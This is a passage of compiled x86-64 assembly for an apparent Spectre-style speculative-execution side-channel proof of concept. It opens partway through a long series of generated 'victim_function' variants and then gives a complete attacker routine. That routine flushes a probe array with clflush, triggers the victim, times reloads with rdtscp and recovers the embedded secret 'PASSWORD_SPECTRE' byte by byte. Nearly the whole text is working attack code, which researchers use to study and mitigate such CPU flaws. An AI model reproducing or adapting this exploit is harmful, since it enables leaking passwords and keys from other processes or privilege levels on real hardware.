	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2478
.Lvictim_function_win0_var2478:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2479
.Lvictim_function_win0_var2479:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2480
.Lvictim_function_win0_var2480:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2481
.Lvictim_function_win0_var2481:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2482
.Lvictim_function_win0_var2482:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2483
.Lvictim_function_win0_var2483:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2484
.Lvictim_function_win0_var2484:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2485
.Lvictim_function_win0_var2485:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2486
.Lvictim_function_win0_var2486:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2487
.Lvictim_function_win0_var2487:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2488
.Lvictim_function_win0_var2488:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2489
.Lvictim_function_win0_var2489:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2490
.Lvictim_function_win0_var2490:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2491
.Lvictim_function_win0_var2491:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2492
.Lvictim_function_win0_var2492:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2493
.Lvictim_function_win0_var2493:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2494
.Lvictim_function_win0_var2494:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	nop
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2495
.Lvictim_function_win0_var2495:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2496
.Lvictim_function_win0_var2496:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2497
.Lvictim_function_win0_var2497:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2498
.Lvictim_function_win0_var2498:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2499
.Lvictim_function_win0_var2499:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
.Lvictim_function_win0_continue:
	addq	$32, %rsp
	movq	-8(%rbp), %rcx
	movzbl	(%rax,%rcx), %eax
	shll	$12, %eax
	movslq	%eax, %rcx
	movq	_probe@GOTPCREL(%rip), %rax
	movb	(%rax,%rcx), %al
	movb	%al, _tmp(%rip)
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.section	__TEXT,__literal8,8byte_literals
	.p2align	3, 0x0                          ## -- Begin function attacker_function
LCPI1_0:
	.quad	0x40c3880000000000              ## double 1.0E+4
LCPI1_1:
	.quad	0x4059000000000000              ## double 100
	.section	__TEXT,__text,regular,pure_instructions
	.globl	_attacker_function
	.p2align	4, 0x90
_attacker_function:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$1152, %rsp    # # imm = 0x480
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	%rax, -8(%rbp)
	leaq	-32(%rbp), %rdi
	xorl	%esi, %esi
	movl	$17, %edx
	callq	_memset
	movl	$0, -1076(%rbp)
LBB1_1:                                 ## =>This Loop Header: Depth=1
                                        ##     Child Loop BB1_3 Depth 2
                                        ##       Child Loop BB1_5 Depth 3
                                        ##       Child Loop BB1_9 Depth 3
                                        ##     Child Loop BB1_18 Depth 2
	cmpl	$16, -1076(%rbp)
	jge	LBB1_26
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-1056(%rbp), %rdi
	xorl	%esi, %esi
	movl	$1024, %edx    # # imm = 0x400
	callq	_memset
	movl	$0, -1080(%rbp)
	movl	$0, -1084(%rbp)
LBB1_3:                                 ##   Parent Loop BB1_1 Depth=1
                                        ## =>  This Loop Header: Depth=2
                                        ##       Child Loop BB1_5 Depth 3
                                        ##       Child Loop BB1_9 Depth 3
	cmpl	$10000, -1084(%rbp)    # # imm = 0x2710
	jge	LBB1_17
## %bb.4:                               ##   in Loop: Header=BB1_3 Depth=2
	movq	_memory_slot_ptr@GOTPCREL(%rip), %rax
	movq	_memory_slot@GOTPCREL(%rip), %rcx
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	leaq	_secret_key(%rip), %rcx
	movq	%rcx, (%rax)
	movq	_memory_slot_ptr@GOTPCREL(%rip), %rax
	clflush	(%rax)
	movl	$0, -1088(%rbp)
LBB1_5:                                 ##   Parent Loop BB1_1 Depth=1
                                        ##     Parent Loop BB1_3 Depth=2
                                        ## =>    This Inner Loop Header: Depth=3
	cmpl	$256, -1088(%rbp)    # # imm = 0x100
	jge	LBB1_8
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=3
	movl	-1088(%rbp), %eax
	shll	$12, %eax
	movslq	%eax, %rcx
	movq	_probe@GOTPCREL(%rip), %rax
	addq	%rcx, %rax
	clflush	(%rax)
## %bb.7:                               ##   in Loop: Header=BB1_5 Depth=3
	movl	-1088(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1088(%rbp)
	jmp	LBB1_5
LBB1_8:                                 ##   in Loop: Header=BB1_3 Depth=2
	mfence
	movslq	-1076(%rbp), %rdi
	callq	_victim_function
	movl	$0, -1092(%rbp)
LBB1_9:                                 ##   Parent Loop BB1_1 Depth=1
                                        ##     Parent Loop BB1_3 Depth=2
                                        ## =>    This Inner Loop Header: Depth=3
	cmpl	$256, -1092(%rbp)    # # imm = 0x100
	jge	LBB1_15
## %bb.10:                              ##   in Loop: Header=BB1_9 Depth=3
	movl	-1092(%rbp), %eax
	shll	$12, %eax
	movslq	%eax, %rcx
	movq	_probe@GOTPCREL(%rip), %rax
	addq	%rcx, %rax
	movq	%rax, -1104(%rbp)
	leaq	-1080(%rbp), %rax
	movq	%rax, -1064(%rbp)
	movq	-1064(%rbp), %rax
	movq	%rax, -1144(%rbp)    # # 8-byte Spill
	rdtscp
	movq	%rdx, %rsi
	movl	%ecx, %edx
	movq	-1144(%rbp), %rcx    # # 8-byte Reload
	shlq	$32, %rsi
	orq	%rsi, %rax
	movl	%edx, (%rcx)
	movq	%rax, -1112(%rbp)
	movq	-1104(%rbp), %rax
	movb	(%rax), %al
	movzbl	%al, %eax
	movl	%eax, -1080(%rbp)
	leaq	-1080(%rbp), %rax
	movq	%rax, -1072(%rbp)
	movq	-1072(%rbp), %rax
	movq	%rax, -1136(%rbp)    # # 8-byte Spill
	rdtscp
	movq	%rdx, %rsi
	movl	%ecx, %edx
	movq	-1136(%rbp), %rcx    # # 8-byte Reload
	shlq	$32, %rsi
	orq	%rsi, %rax
	movl	%edx, (%rcx)
	subq	-1112(%rbp), %rax
	movq	%rax, -1120(%rbp)
	cmpq	$100, -1120(%rbp)
	ja	LBB1_13
## %bb.11:                              ##   in Loop: Header=BB1_9 Depth=3
	movl	-1092(%rbp), %eax
	movslq	-1076(%rbp), %rdx
	leaq	_public_key(%rip), %rcx
	movzbl	(%rcx,%rdx), %ecx
	cmpl	%ecx, %eax
	je	LBB1_13
## %bb.12:                              ##   in Loop: Header=BB1_9 Depth=3
	movslq	-1092(%rbp), %rax
	movl	-1056(%rbp,%rax,4), %ecx
	addl	$1, %ecx
	movl	%ecx, -1056(%rbp,%rax,4)
LBB1_13:                                ##   in Loop: Header=BB1_9 Depth=3
	jmp	LBB1_14
LBB1_14:                                ##   in Loop: Header=BB1_9 Depth=3
	movl	-1092(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1092(%rbp)
	jmp	LBB1_9
LBB1_15:                                ##   in Loop: Header=BB1_3 Depth=2
	jmp	LBB1_16
LBB1_16:                                ##   in Loop: Header=BB1_3 Depth=2
	movl	-1084(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1084(%rbp)
	jmp	LBB1_3
LBB1_17:                                ##   in Loop: Header=BB1_1 Depth=1
	movl	-1080(%rbp), %ecx
	movb	_tmp(%rip), %al
	movzbl	%al, %eax
	xorl	%ecx, %eax
                                        ## kill: def $al killed $al killed $eax
	movb	%al, _tmp(%rip)
	movl	$-1, -1124(%rbp)
	movl	$0, -1128(%rbp)
LBB1_18:                                ##   Parent Loop BB1_1 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
	cmpl	$256, -1128(%rbp)    # # imm = 0x100
	jge	LBB1_24
## %bb.19:                              ##   in Loop: Header=BB1_18 Depth=2
	cmpl	$0, -1124(%rbp)
	jl	LBB1_21
## %bb.20:                              ##   in Loop: Header=BB1_18 Depth=2
	movslq	-1124(%rbp), %rax
	movl	-1056(%rbp,%rax,4), %eax
	movslq	-1128(%rbp), %rcx
	cmpl	-1056(%rbp,%rcx,4), %eax
	jge	LBB1_22
LBB1_21:                                ##   in Loop: Header=BB1_18 Depth=2
	movl	-1128(%rbp), %eax
	movl	%eax, -1124(%rbp)
LBB1_22:                                ##   in Loop: Header=BB1_18 Depth=2
	jmp	LBB1_23
LBB1_23:                                ##   in Loop: Header=BB1_18 Depth=2
	movl	-1128(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1128(%rbp)
	jmp	LBB1_18
LBB1_24:                                ##   in Loop: Header=BB1_1 Depth=1
	movl	-1076(%rbp), %esi
	movl	-1124(%rbp), %edx
	movslq	-1124(%rbp), %rax
	cvtsi2sdl	-1056(%rbp,%rax,4), %xmm0
	movsd	LCPI1_1(%rip), %xmm1    # # xmm1 = [1.0E+2,0.0E+0]
	mulsd	%xmm1, %xmm0
	movsd	LCPI1_0(%rip), %xmm1    # # xmm1 = [1.0E+4,0.0E+0]
	divsd	%xmm1, %xmm0
	leaq	L_.str(%rip), %rdi
	movb	$1, %al
	callq	_printf
	movl	-1124(%rbp), %eax
	movb	%al, %cl
	movslq	-1076(%rbp), %rax
	movb	%cl, -32(%rbp,%rax)
## %bb.25:                              ##   in Loop: Header=BB1_1 Depth=1
	movl	-1076(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1076(%rbp)
	jmp	LBB1_1
LBB1_26:
	leaq	-32(%rbp), %rsi
	leaq	L_.str.1(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	-8(%rbp), %rcx
	cmpq	%rcx, %rax
	jne	LBB1_28
## %bb.27:
	addq	$1152, %rsp    # # imm = 0x480
	popq	%rbp
	retq
LBB1_28:
	callq	___stack_chk_fail
	.cfi_endproc
                                        ## -- End function
	.globl	_main                           ## -- Begin function main
	.p2align	4, 0x90
_main:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$16, %rsp
	movl	$0, -4(%rbp)
	movl	$0, -8(%rbp)
LBB2_1:                                 ## =>This Inner Loop Header: Depth=1
	movslq	-8(%rbp), %rax
	cmpq	$1048576, %rax    # # imm = 0x100000
	jae	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-8(%rbp), %rcx
	movq	_probe@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-8(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -8(%rbp)
	jmp	LBB2_1
LBB2_4:
	callq	_attacker_function
	movl	-4(%rbp), %eax
	addq	$16, %rsp
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.section	__DATA,__data
	.globl	_secret_key                     ## @secret_key
	.p2align	4, 0x0
_secret_key:
	.asciz	"PASSWORD_SPECTRE"
	.globl	_public_key                     ## @public_key
	.p2align	4, 0x0
_public_key:
	.asciz	"################"
	.globl	_tmp                            ## @tmp
.zerofill __DATA,__common,_tmp,1,0
	.comm	_memory_slot_ptr,2048,4         ## @memory_slot_ptr
	.comm	_probe,1048576,4                ## @probe
	.comm	_memory_slot,2048,4             ## @memory_slot
	.section	__TEXT,__cstring,cstring_literals
	L_.str	:    # # @.str
	.asciz	"idx:%2d, highest:%c, hitrate:%f\n"
	L_.str.1	:    # # @.str.1
	.asciz	"%s\n"
.subsections_via_symbols
